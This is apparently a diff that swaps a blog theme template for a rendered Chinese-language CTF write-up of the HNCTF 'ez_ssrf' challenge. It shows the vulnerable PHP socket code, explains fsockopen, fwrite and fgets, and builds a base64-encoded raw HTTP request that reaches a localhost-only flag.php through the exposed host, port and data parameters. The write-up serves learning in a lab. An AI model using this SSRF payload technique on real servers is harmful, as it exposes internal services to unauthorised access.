@@ -1,107 +1,62 @@
-extends includes/layout.pug
+<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>HNCTF[ez_ssrf] | Boogiepop Don't Laugh</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - 共 $1 行","copy":"复制","copyFinish":"复制成功","expand":"展开"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Boogiepop Don't Laugh" type="application/atom+xml">
+</head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>HNCTF[ez_ssrf]</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2022-10-06T16:58:56.309Z" id="date"> 2022-10-07</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2022-10-06T17:13:55.737Z" id="updated"> 2022-10-07</time></div></span></div></div><hr><div id="post-content"><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>进入靶场访问index.php，出现如下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>,<span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>),<span class="variable">$error</span>,<span class="variable">$errstr</span>,<span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$data</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>,<span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-block content
-  -
-    const prev = page.prev
-    const next = page.next
-    const dateConf = theme.post.date
-    const updatedConf = theme.post.updated
-    const excerptConf = theme.post.excerpt
-    const reward = theme.post.reward
-    const encrypted = page.encrypt || page.password
-    const tocContent = encrypted === undefined ? toc(page.content, theme.toc) : toc(page.origin, theme.toc)
-    const countWord = theme.post.count === true && wordcount !== undefined ? wordcount(page.content) : null
-    const countTime = theme.post.time === true && min2read !== undefined ? min2read(page.content) : null
-  #post-bg
-    #post-title
-      h1= page.title
-      if (dateConf || updatedConf) && page.published
-        #post-info
-          - var first = true
-          if dateConf
-            span #{__('post.posted')}
-              div.control
-                time(datetime=page.date.toJSON())#date
-                  = ' ' + date(page.date, date_format)
-            - first = false
-          if updatedConf
-            if !first
-              br
-            span #{__('post.edited')}
-              div.control
-                time(datetime=page.updated.toJSON())#updated
-                  = ' ' + date(page.updated, date_format)
-            - first = false
-          if countWord
-            if !first
-              br
-            span #{__('post.countTotal')}
-              div.control #{countWord}
-            - first = false
-          if countTime
-            if !first
-              br
-            span #{__('post.timeTotal')}
-              div.control #{countTime} #{__('post.timeUnit')}
-    hr
-    #post-content
-      if excerptConf || encrypted
-        != page.content
-      else
-        != page.more
-      #paginator!= paginator()
-    #post-footer
-      if prev || next
-        - let fix = ""
-        if prev === undefined
-          - fix = "justify-content: flex-end"
-        if next === undefined
-          - fix = "justify-content: flex-start"
-        #pages(style=fix)
-          if prev !== undefined
-            .footer-link(style="width: 50%;text-align:right;border-right:1px #fe2 solid")
-              a(href=url_for(prev.path))
-                |← Next
-                = ' ' + prev.title
-          if next !== undefined
-            .footer-link(style="width: 50%;right:1px;border-left:1px #fe2 solid")
-              a(href=url_for(next.path))
-                = next.title + ' '
-                |Prev →
-    if reward
-      details#reward
-        summary #{__('post.reward')}
-        each imgSrc, pay in reward
-          div
-            span #{pay}
-            br
-            img(src=config.root + imgSrc)
-    -
-      let count = (theme.valine.enable === true) +
-                  (theme.gitalk.enable === true) +
-                  (theme.waline.enable === true)
-    if page.comments && count
-      #comments
-        if count > 0
-          .selector
-            if theme.valine.enable === true
-              button.valine-sel
-            if theme.gitalk.enable === true
-              button.gitalk-sel
-            if theme.waline.enable === true
-              button.waline-sel
-        if theme.valine.enable === true
-          #valine
-        if theme.gitalk.enable === true
-          #gitalk
-        if theme.waline.enable === true
-          #waline
+<h2 id="基础介绍"><a href="#基础介绍" class="headerlink" title="基础介绍"></a>基础介绍</h2><p>一眼就知道是ssrf代码，这里介绍一下一些函数吧！</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_51353029/article/details/113574201?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166507523916782390518024%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=166507523916782390518024&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-113574201-null-null.142">https://blog.csdn.net/weixin_51353029/article/details/113574201?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166507523916782390518024%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=166507523916782390518024&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-113574201-null-null.142</a></p>
+<ul>
+<li><p><code>fsockopen</code> : 打开一个网络连接或者一个Unix套接字连接</p>
+<p>格式：fsockopen(主机名称 hostname，端口号 port，错误号的接受变量 errno，错误提示的接受变量errstr，超时时间 timeout)<br>port：端口号，如果对该参数传一个-1，则表示不使用端口，例如unix:&#x2F;&#x2F;。<br>errno：如果errno的返回值为0，而且这个函数的返回值为 FALSE ，那么这表明该错误发生在套接字连接（connect()）调用之前，导致连接失败的原因最大的可能是初始化套接字的时候发生了错误。<br>errstr：错误信息将以字符串的信息返回。<br>timeout：设置连接的时限，单位为秒。</p>
+</li>
+<li><p><code>fwrite(file,string,length)</code>:</p>
+<p>函数将内容写入一个打开的文件中。</p>
+<p>函数会在到达指定长度或读到文件末尾（EOF）时（以先到者为准），停止运行。</p>
+<p>如果函数成功执行，则返回写入的字节数。如果失败，则返回 FALSE。</p>
+<p>在这道题他是给我们请求的连接添加请求头的</p>
+</li>
+<li><p><code>feof()</code>:如果出错或者文件指针到了文件末尾（eof）则返回 ture，否则返回 faluse。这样就保证了读取,言简意赅的说就读取文件，读到最后</p>
+</li>
+<li><p><code>fgets()</code>：函数会在到达指定长度( length - 1 )、碰到换行符、读到文件末尾（EOF）时（以先到者为准,停止返回一个新行。如果失败该函数返回 FALSE。也就是返回值是一行行的返回，<a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-filesystem-fgets.html">https://www.runoob.com/php/func-filesystem-fgets.html</a></p>
+</li>
+</ul>
+<p>​	<img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221007005816961.png" alt="image-20221007005816961"></p>
+<h2 id="题解环节"><a href="#题解环节" class="headerlink" title="题解环节"></a>题解环节</h2><p>首先用dirsearch去查一下目录可以发现：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221007010204482.png" alt="image-20221007010204482"></p>
+<p>存在flag.php，进入界面：<br><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221007010223350.png" alt="image-20221007010223350"></p>
+<p>告诉我们要本地用户，那我们就得开始伪造请求了</p>
+<p>构造以下本地文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$out</span> = <span class="string">&quot;GET /flag.php HTTP/1.1\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Host: 127.0.0.1\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Connection: Keep-Alive\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$out</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$out</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-block aside-block
-  - 
-    const encrypted = page.encrypt || page.password
-    const tocContent = encrypted === undefined ? toc(page.content, theme.toc) : toc(page.origin, theme.toc)
-  if (tocContent.length > 0)
-    #toc-div(style=encrypted !== undefined?"display:none":"")
-      h1 #{__('post.index')}
-      |!{tocContent}
+<p>这一些信息是我们要通过fwrite写进我们的会话中的，这些就是请求头，介绍一下请求头，以下面的为例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: www.wrox.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</span><br><span class="line">Gecko/20050225 Firefox/1.0.1</span><br><span class="line">Connection: Keep-Alive</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221007010545073.png" alt="image-20221007010545073"></p>
+<p>所以我们也需要添加这些信息，第三行的connection是必须要的</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221007010626570.png" alt="image-20221007010626570"></p>
+<p>最后根据这个来构造payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=<span class="number">127.0</span>.<span class="number">0.1</span>&amp;port=<span class="number">80</span>&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBLZWVwLUFsaXZlDQoNCg==</span><br></pre></td></tr></table></figure>
+
+<p>本地肯定就是127.0.0.1，然后80是默认的apache端口，这样就可以得到flag拉~</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221007010825637.png" alt="image-20221007010825637"></p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2022/10/07/HNCTF%5Bcanyource%5D/">← Next HNCTF[canyource]</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/10/06/CTFSHOW-SSRF/">CTFSHOW-SSRF Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="文章目录">≡</a><a id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Boogipop</a></h1><div id="description"><p>Are you still in pain?</p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.</span> <span class="toc-text">基础介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%E7%8E%AF%E8%8A%82"><span class="toc-number">3.</span> <span class="toc-text">题解环节</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{code.findCode();}</script><script src="/js/arknights.js"></script><script src="/js/pjax.js"></script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
